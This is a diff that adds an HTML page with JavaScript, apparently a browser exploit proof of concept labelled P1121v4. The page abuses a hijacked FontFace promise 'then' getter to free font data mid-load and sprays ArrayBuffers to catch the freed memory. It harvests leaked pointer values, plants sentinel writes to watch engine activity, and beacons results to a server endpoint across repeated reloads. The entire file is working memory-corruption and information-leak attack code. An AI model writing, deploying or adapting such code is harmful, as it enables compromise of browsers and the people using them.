@@ -1,0 +1,133 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1121</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+var sess;
+try{sess=JSON.parse(localStorage.getItem('p1121v4')||'null');}catch(e){sess=null;}
+if(!sess)sess={boot:0,hits:0,misses:0,snaps:[],oracles:[]};
+sess.boot++;
+try{localStorage.setItem('p1121v4',JSON.stringify(sess));}catch(e){}
+
+B('P1121-BOOT','b='+sess.boot+'|h='+sess.hits+'|m='+sess.misses);
+log('phase','=== P1121v4: ORACLE (boot '+sess.boot+', '+sess.hits+' hits) ===');
+
+if(sess.boot>40){
+  log('ok','DONE. '+sess.hits+' hits, '+sess.misses+' misses');
+  B('P1121-ALLDONE','h='+sess.hits+'|m='+sess.misses);
+  for(var i=0;i<sess.snaps.length;i++)B('P1121-S'+i,sess.snaps[i]);
+  for(var i=0;i<sess.oracles.length;i++)B('P1121-O'+i,sess.oracles[i]);
+}else{
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;var r=sess.boot;
+var fired=false,map=null,found=false,oracleDone=false;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
+  }
+  try{document.fonts.check('1em r'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+// Fast polling — detect async engine writes (proven pattern from P1117c)
+for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+  if(found||!map)return;
+  for(var bi=20;bi<56;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!found){
+      found=true;
+      // SNAPSHOT: record all non-zero qwords
+      var snap=[];
+      for(var q=0;q<b.length;q++){
+        if(b[q]!==0n){
+          var hi=Number(b[q]>>32n);
+          var tag=hi>=0x200&&hi<=0x7FFF?'C':hi>=0x10&&hi<=0xFF?'H':hi>=0xFFFF8000?'K':'v';
+          snap.push(q+':'+hex64(b[q])+tag);
+        }
+      }
+      var snapStr='r'+r+'|bi='+bi+'|sz='+map[bi].size+'|ms='+ms+'|'+snap.join(',');
+      sess.snaps.push(snapStr);
+      sess.hits++;
+      B('P1121-SNAP',snapStr);
+      log('win','HIT! '+snap.join(' '));
+
+      // ORACLE: write sentinels to ALL zero offsets
+      for(var q=0;q<b.length;q++){
+        if(b[q]===0n)b[q]=BigInt('0xBBBB'+q.toString(16).padStart(4,'0')+'AAAA0000');
+      }
+      // Schedule oracle readback at 50ms and 120ms after hit
+      setTimeout(function(){
+        if(oracleDone)return;oracleDone=true;
+        var ch=[];
+        for(var q=0;q<b.length;q++){
+          var v=b[q];
+          var sentinel=BigInt('0xBBBB'+q.toString(16).padStart(4,'0')+'AAAA0000');
+          if(v!==sentinel)ch.push(q+':'+hex64(v));
+        }
+        var orcStr='r'+r+'|'+ch.join(',');
+        sess.oracles.push(orcStr);
+        B('P1121-ORC',orcStr);
+        try{localStorage.setItem('p1121v4',JSON.stringify(sess));}catch(e){}
+        log('info','Oracle: '+ch.length+' active');
+      },50);
+      setTimeout(function(){
+        if(oracleDone)return;oracleDone=true;
+        var ch=[];
+        for(var q=0;q<b.length;q++){
+          var v=b[q];
+          var sentinel=BigInt('0xBBBB'+q.toString(16).padStart(4,'0')+'AAAA0000');
+          if(v!==sentinel)ch.push(q+':'+hex64(v));
+        }
+        var orcStr='r'+r+'@120|'+ch.join(',');
+        sess.oracles.push(orcStr);
+        B('P1121-ORC2',orcStr);
+        try{localStorage.setItem('p1121v4',JSON.stringify(sess));}catch(e){}
+      },120);
+
+      try{localStorage.setItem('p1121v4',JSON.stringify(sess));}catch(e){}
+    }
+  }
+},ms);})(t);}
+
+// Miss check at 300ms
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!found){
+    sess.misses++;
+    B('P1121-M','r'+r);
+    try{localStorage.setItem('p1121v4',JSON.stringify(sess));}catch(e){}
+    log('info','Miss #'+sess.misses);
+  }
+},300);
+
+} // end if boot<=40
+</script>
+</body></html>
